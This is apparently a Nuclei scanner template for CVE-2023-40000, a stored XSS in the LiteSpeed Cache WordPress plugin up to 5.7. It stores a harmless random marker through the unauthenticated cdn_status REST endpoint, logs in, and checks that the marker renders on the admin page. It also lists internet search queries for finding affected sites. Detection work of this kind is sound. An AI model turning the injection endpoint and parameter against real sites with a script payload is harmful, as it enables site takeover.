id: CVE-2023-40000

info:
  name: LiteSpeed Cache <= 5.7 - Priv Esc via Stored XSS
  author: 0x_Akoko
  severity: high
  description: |
    (1) Unauth POST stores a unique marker via /wp-json/litespeed/v1/cdn_status
    (2) Login to WP and GET LSCache admin page to confirm the same marker renders (stored XSS).
    Includes a reporting readme version check (<= 5.7.0.1) that prints the version.
  reference:
    - https://wpscan.com/vulnerability/dd9054cc-1259-427d-a4ad-1875b7b2b3b4
    - https://wordpress.org/plugins/litespeed-cache
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cve-id: CVE-2023-40000
  metadata:
    fofa-query: "wp-content/plugins/litespeed-cache/"
    google-query: inurl:"/wp-content/plugins/litespeed-cache/"
    shodan-query: 'vuln:CVE-2023-40000'
  tags: cve,wordpress,wp-plugin,litespeed-cache,high

variables:
  marker: "NUCLEI_LSCACHE_{{randstr}}"
  wp_user: ""          # set with -var wp_user=admin
  wp_pass: ""          # set with -var wp_pass='password'

# NEVER block the PoC, then POST -> LOGIN -> VERIFY
flow: |
  ( http("version-report") || true ) &&
  http("store-marker") &&
  http("login") &&
  http("verify-admin")

http:
  # Version report
  - id: version-report
    method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/litespeed-cache/readme.txt"
      - "{{BaseURL}}/wp-content/plugins/litespeed-cache/README.txt"
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: dsl
        dsl:
          - compare_versions(ver, "< 5.7.0.1")
    extractors:
      - type: regex
        name: ver
        internal: true
        group: 1
        part: body
        regex:
          - '(?im)^(?:Stable tag|Version)\s*:\s*([0-9.]+)\s*$'
      # printed vulnerable version
      - type: regex
        name: detected_version
        group: 1
        part: body
        regex:
          - '(?im)^(?:Stable tag|Version)\s*:\s*([0-9.]+)\s*$'

  # 1) Store marker (unauth)
  - id: store-marker
    method: POST
    path:
      - "{{BaseURL}}/wp-json/litespeed/v1/cdn_status"
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: "Mozilla/5.0 Nuclei"
    body: "success=0&result[_msg]={{marker}}"
    cookie-reuse: true
    redirects: true

  # 2) Login with credentials
  - id: login
    raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 Nuclei

        log={{wp_user}}&pwd={{wp_pass}}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1
    cookie-reuse: true
    redirects: true
    max-redirects: 3

  # 3) Verify renders in LSCache admin dashboard ONLY this prints success for PoC
  - id: verify-admin
    method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin.php?page=litespeed-cdn"
      - "{{BaseURL}}/wp-admin/admin.php?page=litespeed-general"
      - "{{BaseURL}}/wp-admin/admin.php?page=litespeed"
    stop-at-first-match: true
    headers:
      User-Agent: "Mozilla/5.0 Nuclei"
    cookie-reuse: true
    redirects: true
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        part: body
        words: ["{{marker}}"]
      - type: word
        part: body
        words: ["LiteSpeed Cache"]
